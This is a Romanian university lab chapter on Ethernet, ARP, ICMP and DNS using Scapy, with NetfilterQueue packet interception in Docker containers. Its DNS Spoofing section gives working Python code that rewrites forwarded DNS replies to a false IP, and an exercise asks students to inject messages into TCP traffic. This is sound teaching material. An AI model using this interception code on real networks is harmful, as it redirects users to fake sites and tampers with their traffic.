# Capitolul 5

## Cuprins
- [Requrements](#intro)
- [Ethernet Frame](#ether)
  - [Ethernet Object in Scapy](#ether_scapy)
- [Address Resolution Protocol](#arp)
  - [ARP in Scapy](#arp_scapy)
- [Intercept Packages](#scapy_nfqueue)
    - [Block Intercepted Packages](#scapy_nfqueue_block)
- [Exemple de protocoale în Scapy](#scapy)
  - [Internet Control Message Protocol (ICMP)](#scapy_icmp)
  - [Domain Name System (DNS)](#scapy_dns)
    - [DNS Request](#scapy_dns_request)
    - [Micro DNS Server](#scapy_dns_server)
    - [DNS Spoofing](#scapy_dns_spoofing)
- [Exerciții](#exercitii)

<a name="intro"></a> 
## Introducere
**Important:** continuăm cu aceeași configurație ca în capitolul3 și urmărim secțiunea introductivă de acolo.
```
cd computer-networks

# ștergem toate containerele create default
docker-compose down

# ștergem rețelele create anterior ca să nu se suprapună cu noile subnets
docker network prune

# lucrăm cu docker-compose.yml din capitolul3
cd capitolul3
docker-compose up -d

# sau din directorul computer-networks: 
# docker-compose -f capitolul3/docker-compose.yml up -d
```

<a name="ether"></a> 
## [Ethernet Frame](https://en.wikipedia.org/wiki/Ethernet_frame#Structure)
```
      0    1    2    3    4    5    6    7    Octet nr.
   *----*----*----*----*----*----*----*----*
F  |            Preabmle              | SF | preambul: 7x 10101010, SF: 10101011
   *----*----*----*----*----*----*----*----*
DL |          Source MAC         |           MAC sursa: 02:42:c6:0a:00:02
   *----*----*----*----*----*----*      
DL |     Destination MAC         |           MAC dest:  02:42:c6:0a:00:01 (gateway)
   *----*----*----*----*----*----*
DL | 802-1Q (optional) |
   *----*----*----*----*
DL | EthType |                               0x0800 pt IPv4, 0x0806 pt ARP, 0x86DD pt IPv6
   *----*----*----*---------------------------------------
DL |   Application payload + TCP + IP (max 1500 octets)      <--- maximum transmission unit (MTU)
   *----*----*----*---------------------------------------
DL |  32-bit CRC  |                                          <--- cod de detectare erori
   *----*----*----*----*----*----*----*-------
F  |     Interpacket Gap  - interval de timp |
   *----*----*----*----*----*----*----*-------
```
La nivelurile legatură de date și fizic, avem standardele [IEEE 802](https://ieeexplore.ieee.org/browse/standards/get-program/page/series?id=68) care ne definesc structurile cadrelor (frames).
Explicații:

- [Istoria protocolului Ethernet](https://www.enwoven.com/collections/view/1834/timeline).
- [Cartea albastră a protocolului Ethernet](http://decnet.ipv7.net/docs/dundas/aa-k759b-tk.pdf)
- [Mai multe detalii](https://notes.shichao.io/tcpv1/ch3/).

Fiecare secventă de 4 liniuțe reprezintă un octet (nu un bit ca in diagramele anterioare) iar headerul cuprinde:
- [preambulul](https://networkengineering.stackexchange.com/questions/24842/how-does-the-preamble-synchronize-other-devices-receiving-clocks) are o dimensiune de 7 octeți, fiecare octet de forma 10101010, și este folosit pentru sincronizarea ceasului receiver-ului. Mai multe detalii despre ethernet în acest [clip](https://www.youtube.com/watch?v=5u52wbqBgEY).
- SF (start of frame) reprezinta un octet (10101011) care delimitează start of frame
- [adresele MAC (Media Access Control)](http://www.dcs.gla.ac.uk/~lewis/networkpages/m04s03EthernetFrame.htm), sursă și destinație, sunt reprezentate pe 6 octeți (48 de biți). [Aici puteți citi articolul](https://ethernethistory.typepad.com/papers/HostNumbers.pdf) din 1981 despre specificația adreselor. Există o serie de [adrese rezervate](https://www.cavebear.com/archive/cavebear/Ethernet/multicast.html) pentru
- [802-1q](https://en.wikipedia.org/wiki/IEEE_802.1Q) este un header pentru rețele locale virtuale (aici un [exemplu de configurare VLAN](https://www.redhat.com/sysadmin/vlans-configuration)).
- EthType indică codul [protocolului](https://en.wikipedia.org/wiki/EtherType#Examples) din layer-ul superior acestui frame
- codul [CRC](https://en.wikipedia.org/wiki/Cyclic_redundancy_check#Computation) pentru [polinomul de Ethernet](https://xcore.github.io/doc_tips_and_tricks/crc.html#the-polynomial) pe 32 de biti: [0x 04 C1 1D B7]() cu [exemplu si aici](https://stackoverflow.com/questions/2587766/how-is-a-crc32-checksum-calculated)
- [Interpacket Gap](https://en.wikipedia.org/wiki/Interpacket_gap) - nu face efectiv parte din frame, ci reprezintă un spațiu de inactivitate, mai bine explicat [aici](http://www.mplsvpn.info/2010/05/what-is-inter-packet-gap-or-inter-frame.html).

Standaredele 802.11 pentru Wi-Fi au alta structura a frameurilor. Mai multe explicatii se gasesc in curs, la nivelul data link si in [materialul acesta](https://www.oreilly.com/library/view/80211-wireless-networks/0596100523/ch04.html) iar exemple de utilizare cu scapy pot fi [accesate aici](https://wlan1nde.wordpress.com/2016/06/28/using-scapy-to-send-wlan-frames/)

<a name="ether_scapy"></a> 
### Ethernet Object in Scapy
```python
e = Ether()       
e.show()
WARNING: Mac address to reach destination not found. Using broadcast.
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 02:42:c6:0d:00:0e
  type= 0x9000

# preambulul, start of frame și interpacket gap sunt parte a nivelului fizic
# CRC-ul este calculat automat de către kernel
# singurele câmpuri de care trebuie să ținem cont sunt adresele și EthType
```

<a name="arp"></a> 
## [Address Resolution Protocol](http://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html)
[ARP](https://www.youtube.com/watch?v=QPi5Nvxaosw) este un protocol care face maparea între protocolul de retea (IP) și adresele hardware/fizice sau Media Access Control (MAC) de pe o rețea locală. Acesta a fost definit în [RFC 826](https://tools.ietf.org/html/rfc826), în 1982 și este strâns legat de adresele IPv4, pentru IPv6 există [neighbour discovery](https://tools.ietf.org/html/rfc3122). Un tutorial bun și mai multe explicații pot fi [găsite și aici](http://www.danzig.jct.ac.il/tcp-ip-lab/ibm-tutorial/3376c28.html)

Antetul pentru ARP este redat cu adresele hardware iesind din limita de 32 de biti:
```
  0               1               2               3              4 Offs.
  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |         HWType                |           ProtoType           |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |   HWLen       |   ProtoLen    |          Operation            |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Hardware Sursa          de tipul  HWType          <--- HWLen octeti (6 pt Ethernet)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Proto Destinatie        de tipul ProtoType        <--- ProtoLen octeti (4 pt IPv4)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Hardware Destinatie                               <--- HWLen octeti (6 pt Ethernet)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                   Adresa Proto Destinatie                                  <--- ProtoLen octeti (4 pt IPv4)
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

```

- HWType - [tipul de adresa fizică](https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml#arp-parameters-2), codul 1 pentru Ethernet (adrese MAC)
- ProtoType - indică codul [protocolului](https://en.wikipedia.org/wiki/EtherType#Examples) folosit ca adresa la nivelul rețea - 0x0800 sau 2048 pentru IPv4
- HWLen - este lungimea adresei hardware sursă sau destinație, pentru Ethernet valoarea este 6 (o adresă MAC are 6 octeți)
- ProtoLen - reprezintă lungimea adresei de la protocolul destinație, pentru IPv4 valoarea este 4 (o adresă IPv4 are 4 octeți)
- Adresa Hardware Sursă/Destinație - lungime variabilă în funcție de HWLen, în general adrese Ethernet
- Adresa Proto Sursă/Destinație - lungime variabilă în funcție de HWLen, în general adrese IPv4
 
<a name="arp_scapy"></a> 
### Ethernet Object in Scapy
Vom lucra cu adrese MAC standard și IPv4, acestea sunt publice și sunt colectate din rețeaua locală. În scapy este deja implementat antetul pentru ARP:
```python
>>> ls(ARP)
hwtype     : XShortField                         = (1)                     # ce tip de adresa fizica, 1 pt MAC-uri
ptype      : XShortEnumField                     = (2048)                  # protocolul folosit, similar cu EthType 
hwlen      : ByteField                           = (6)                     # dimensiunea adresei MAC (6 octeti)
plen       : ByteField                           = (4)                     # dimensiunea adresei IP (pentru v4, 4 octeti)
op         : ShortEnumField                      = (1)                     # operatiunea 1 pentru request, 0 pentru reply   
hwsrc      : ARPSourceMACField                   = (None)                  # adresa MAC sursa
psrc       : SourceIPField                       = (None)                  # adresa IP sursa
hwdst      : MACField                            = ('00:00:00:00:00:00')   # adresa MAC destinatie
pdst       : IPField                             = ('0.0.0.0')             # adresa IP destinatie (poate fi si un subnet)
```

Pentru a putea trimite un mesaj unui IP din rețeaua locală, va trebui să știm adresa hardware a acestuia iar ca să aflăm această adresă trebuie să trimitem pe întreaga rețea locală (prin difuzare sau broadcast) întrebarea "Cine are adresa MAC pentru IP-ul X?". În cazul în care un dispozitiv primește această întrebare și se identifică cu adresa IP, el va răspunde cu adresa lui fizică.
Perechile de adrese hardware și adrese IP sunt stocate într-un tabel cache pe fiecare dispozitiv. 

Exemplu în scapy:
```python
# adresa fizică rezervata pentru broadcast ff:ff:ff:ff:ff:ff
eth = Ether(dst = "ff:ff:ff:ff:ff:ff")

# adresa proto destinație - IP pentru care dorim să aflăm adersa fizică
arp = ARP(pdst = '198.13.13.1')

# folosim srp1 - send - receive (sr) 1 pachet
# litera p din srp1 indică faptul că trimitem pachetul la layer data link 
answered = srp1(eth / arp, timeout = 2)

if answered is not None:
    print (answered[ARP].psrc)
    # adresa fizică este:
    print (answered[ARP].hwsrc)
else:
    print ("Nu a putut fi gasita")  
```

În felul acesta putem interoga device-urile din rețea și adresele MAC corespunzătoare. Putem folosi scapy pentru a trimite un broadcast întregului subnet dacă setăm `pdst` cu valoarea subnetului `net`. 


<a name="scapy_nfqueue"></a>
## [Netfilter Queue](https://pypi.org/project/NetfilterQueue/)
Pentru a modifica pachetele care circulă live pe rețeaua noastră, putem folosi librăria [NetfilterQueue](https://netfilter.org/projects/libnetfilter_queue/) care stochează pachetele într-o coadă. La citirea din coadă, pachetele pot fi acceptate (`packet.accept()`) pentru a fi transmise mai departe sau pot fi blocate (`packet.drop()`). În cazul în care dorim să le alterăm în timp real, putem folosi șiruri de octeți pentru a seta payload: `packet.set_payload(bytes(scapy_packet))`, unde payload reprezintă întregul pachet sub formă binară.
Mai multe exemple puteți găsi [în extensia de python](https://pypi.org/project/NetfilterQueue/).
Pentru a folosi librăria, trebuie să adăugăm o regulă în firewall-ul iptables prin care să redirecționăm toate pachetele către o coadă `NFQUEUE` cu un id specific. Acest lucru se poate face din shell:
```bash
# toate pachetele de la input se redirectioneaza catre coada 5
iptables -I INPUT -j NFQUEUE --queue-num 5
```
sau din python:
```python
import os
os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
```

<a name="scapy_nfqueue_block"></a>
### Blocarea unui IP
Ne atașăm containerului router:
```bash
docker-compose exec router bash
```

Dintr-un terminal de python sau dintr-un fișier rulăm:

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os
def proceseaza(pachet):
    # octeti raw, ca dintr-un raw socket
    octeti = pachet.get_payload()
    # convertim octetii in pachet scapy
    scapy_packet = IP(octeti)
    scapy_packet.summary()
    if scapy_packet[IP].src == '198.10.0.2':
        print("Drop la: ", scapy_packet.summary())
        pachet.drop()
    else:
        print("Accept la: ", scapy_packet.summary())
        pachet.accept()

queue = NFQ()
try:
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(5, proceseaza)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()
```

Într-un alt terminal ne atașăm containerului server:
```bash
docker-compose exec server bash
# nu va mai merge
ping router 
```


<a name="scapy"></a> 
## [Exemple de protocoale în Scapy](https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy)

<a name="scapy_dhcp"></a> 
### [Dynamic Host Configuration Protocol](http://www.ietf.org/rfc/rfc2131.txt) si [BOOTP](https://tools.ietf.org/html/rfc951)
- [bootstrap protocol](https://en.wikipedia.org/wiki/Bootstrap_Protocol) a fost înlocuit de [Dynamic Host Configuration Protocol](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol#Operation) pentru asignarea de adrese IPv4 automat device-urilor care se conectează pe rețea
- pentru cerere de IP flow-ul include pașii pentru discover, offer, request și ack
- container de docker [aici](https://github.com/networkboot/docker-dhcpd)
- [exemplu de cod scapy aici](https://github.com/senisioi/computer-networks/blob/2021/capitolul3/src/examples/dhcp.py)

<a name="scapy_icmp"></a> 
### [Internet Control Message Protocol (ICMP)](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages)

Am discutat despre ICMP și ping pentru a verifica dacă două device-uri pot comunica unul cu altul. Principala funcție a protocolului ICMP este de [a raprota erori](https://www.cloudflare.com/learning/ddos/glossary/internet-control-message-protocol-icmp/) iar [mesajele de control](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages) pot varia de la faptul că un host, port sau protocol este inaccesibil până la notificarea că TTL a expirat în tranzit.

```python
ICMP().show()
###[ ICMP ]### 
  type= echo-request
  code= 0
  chksum= None
  id= 0x0
  seq= 0x0

# facem un pachet echo-request, ping
icmp = ICMP(type = 'echo-request')
ip = IP(dst = "137.254.16.101")
pachet = ip / icmp

# folosim sr1 pentru send și un reply
rec = sr1(pachet)
rec.show()

###[ IP ]### 
  version= 4
  ihl= 5
  tos= 0x0
  len= 28
  id= 48253
  flags= DF
  frag= 0
  ttl= 242
  proto= icmp
  chksum= 0x23e7
  src= 137.254.16.101
  dst= 1.15.3.1
  \options\
###[ ICMP ]### 
     type= echo-reply
     code= 0
     chksum= 0x0
     id= 0x0
     seq= 0x0
```

<a name="scapy_dns"></a> 
### [Domain Name System](https://dnsmonitor.com/dns-tutorial-1-the-basics/)

Aici puteți găsi ilustrate informații despre [DNS și DNS over HTTPS](https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/). 
În general, numele care corespund unui server ([Fully Qualified Domain Names](https://kb.iu.edu/d/aiuv)) sunt salvate cu [un punct în plus la sfârșit](https://stackexchange.github.io/dnscontrol/why-the-dot).
În linux există aplicația `dig` cu care putem interoga entries de DNS:
```bash
# interogam serverul 8.8.8.8 pentur a afla la ce IP este fmi.unibuc.ro
dig @8.8.8.8 fmi.unibuc.ro

; <<>> DiG 9.10.3-P4-Ubuntu <<>> @8.8.8.8 fmi.unibuc.ro
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16808
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;fmi.unibuc.ro.         IN  A

;; ANSWER SECTION:
fmi.unibuc.ro.      12925   IN  A   193.226.51.15

;; Query time: 39 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Wed May 13 13:29:13 EEST 2020
;; MSG SIZE  rcvd: 58

```
DNS stochează nu doar informații despre IP-ul corespunzător unui hostname, ci există mai multe tipuri de intrări ([record types](https://ns1.com/resources/dns-types-records-servers-and-queries)) în baza de date:

- A record / Address Mapping - stochează perechi de NUME - IPv4
- AAAA Record - similar cu A, pentru adrese IPv6
- CNAME / Canonical Name - are rolul de a face un alias între un hostname existent și un alt hostname, ex: nlp.unibuc.ro -> nlp-unibuc.github.io
- MX / Mail Exchanger - spcifică server de email SMTP pentru domeniu, încercați `dig @8.8.8.8 fmi.unibuc.ro MX`
- NS / Name Server - specifică ce Authoritative Name Server este responabil pentru o anumită zonă de DNS (ex., pentru fmi.unibuc.ro este ns1.fmi.unibuc.ro), încercați `dig @8.8.8.8 fmi.unibuc.ro NS`
- PTR / Reverse-lookup Pointer - permite interogarea in functie de IP pentru a afla numele
- TXT / Text data - conține informații care pot fi procesate de alte servicii, `dig @8.8.8.8 fmi.unibuc.ro TXT`
- SOA / Start of Authority - conține informații despre autoritatea care se ocupă de acest nume

Protocolul pentru DNS lucrează la nivelul aplicației și este standardizat pentru UDP, port 53. Acesta se bazează pe request-response iar în cazul în care nu se primesc răspunsuri după un număr de reîncercări (de multe ori 2), programul anunță că nu poate găsi IP-ul pentru hostname-ul cerut ("can'r resolve"). Headerul protocolului [este definit aici](http://www.networksorcery.com/enp/protocol/dns.htm).

<a name="scapy_dns_request"></a> 
#### Exemplu DNS request
```python
from scapy.all import *

# DNS request către google DNS
ip = IP(dst = '8.8.8.8')
transport = UDP(dport = 53)

# rd = 1 cod de request
dns = DNS(rd = 1)

# query pentru a afla entry de tipul 
dns_query = DNSQR(qname=b'fmi.unibuc.ro.', qtype=1, qclass=1)
dns.qd = dns_query

answer = sr1(ip / transport / dns)
print (answer[DNS].summary())
```

<a name="scapy_dns_server"></a> 
#### Micro DNS Server
Putem scrie un mic exemplu de aplicație care să funcționeze ca DNS care returnează [DNS A records](https://support.dnsimple.com/articles/a-record/). DNS rulează ca UDP pe portul 53:
```python
simple_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
simple_udp.bind(('0.0.0.0', 53))

while True:
    request, adresa_sursa = simple_udp.recvfrom(65535)
    # converitm payload-ul in pachet scapy
    packet = DNS(request)
    dns = packet.getlayer(DNS)
    if dns is not None and dns.opcode == 0: # dns QUERY
        print ("got: ")
        print (packet.summary())
        dns_answer = DNSRR(      # DNS Reply
           rrname=dns.qd.qname, # for question
           ttl=330,             # DNS entry Time to Live
           type="A",            
           rclass="IN",
           rdata='1.1.1.1')     # found at IP: 1.1.1.1 :)
        dns_response = DNS(
                          id = packet[DNS].id, # DNS replies must have the same ID as requests
                          qr = 1,              # 1 for response, 0 for query 
                          aa = 0,              # Authoritative Answer
                          rcode = 0,           # 0, nicio eroare http://www.networksorcery.com/enp/protocol/dns.htm#Rcode,%20Return%20code
                          qd = packet.qd,      # request-ul original
                          an = dns_answer)     # obiectul de reply
        print('response:')
        print (dns_response.summary())
        simple_udp.sendto(bytes(dns_response), adresa_sursa)
simple_udp.close()
```

Testați-l cu
```bash
dig @localhost fmi.unibuc.ro
```

<a name="scapy_dns_spoofing"></a> 
#### DNS Spoofing
Dacă intermediem conexiunea între două noduri, putem insera răspunsuri DNS malițioase cu scopul de a determina userii să acceseze pagini false. Pe linux, un DNS customizabil se poate set prin fișierul `/etc/resolv.conf` sau ca în [exemplul de aici](https://unix.stackexchange.com/questions/128220/how-do-i-set-my-dns-when-resolv-conf-is-being-overwritten)).

Presupunem că folosim configurația de containere definită în acest capitol, că ne aflăm pe containerul `router` și că monitorizăm toate cererile containerul `server`. În cazul în care observăm un pachet UDP cu portul destinație 53 (e.g., IP destinație 8.8.8.8), putem încerca să trimitem un reply care să pară că vine de la DNS (8.8.8.8) cu o adresă IP falsă care nu apraține numelui interogat de către server. 
E posibil ca reply-ul nostru să ajungă la containerul `server`, dar și reply-ul serverul DNS original (8.8.8.8) să ajungă tot la container. Pentru ca atacul să fie cât mai lin, cel mai sigur este să modificăm live răspunsurile DNS-ului original (8.8.8.8) după următoarele instrucțiuni ([sursa originală](https://www.thepythoncode.com/article/make-dns-spoof-python)):

##### 1. iptables forward către nfqueue
Ne atașăm containerului `router` pentru a ataca containerul `server`. Construim o regulă de iptables prin care toate pachetele care trebuie forwardate (-I FORWARD) să treacă prin regula NFQUEUE cu număr de identificare 10 (putem alege orice număr).
```bash
docker-compose exec router bash

iptables -I FORWARD -j NFQUEUE --queue-num 10
```
##### 2. Scriem o funcție care detectează și modifică pachete de tip DNS reply
Deschidem un terminal de python sau executăm `python3 /elocal/capitolul3/src/examples/dns_spoofing.py`:
```python
#!/usr/bin/env python3

from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os

def detect_and_alter_packet(packet):
    """Functie care se apeleaza pentru fiecare pachet din coada
    """
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    # daca pachetul are layer de IP, UDP si DNSRR (reply)
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(UDP) and scapy_packet.haslayer(DNSRR):\
        # daca e site-ul fmi, apelam functia care face modificari
        if scapy_packet[DNSQR].qname == b'fmi.unibuc.ro.':
            print("[Before]:", scapy_packet.summary())
            # noul scapy_packet este modificat cu functia alter_packet
            scapy_packet = alter_packet(scapy_packet)
            print("[After ]:", scapy_packet.summary())
            # extragem octetii din pachet
            octets = bytes(scapy_packet)
            # il punem inapoi in coada modificat
            packet.set_payload(octets)
    # apelam accept pentru fiecare pachet din coada
    packet.accept()


def alter_packet(packet):
    # obtinem qname sau Question Name
    qname = packet[DNSQR].qname
    # construim un nou raspuns cu reply data
    packet[DNS].an = DNSRR(rrname=qname, rdata='1.1.1.1')
    # answer count = 1
    packet[DNS].ancount = 1
    # am modificat pachetul si stergem campurile len si checksum
    # in mod normal ar trebui recalculate, dar scapy face asta automat
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # returnam pachetul modificat
    return packet
```

##### 3. Executăm coada Netfilter cu funcția definită anterior
```python
queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, detect_and_alter_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
```

Testați din containerul `server`: `docker-compose exec server bash -c "ping fmi.unibuc.ro"`

<a name="exercitii"></a> 
## Exerciții
1. Urmăriți mai multe exemple din scapy [aici](https://scapy.readthedocs.io/en/latest/usage.html#simple-one-liners)
2. Utilizați NetfilterQueue în containerul `router` pentru a intercepta pachete TCP dintre client și server și pentru a injecta mesaje suplimentare în comunicare.
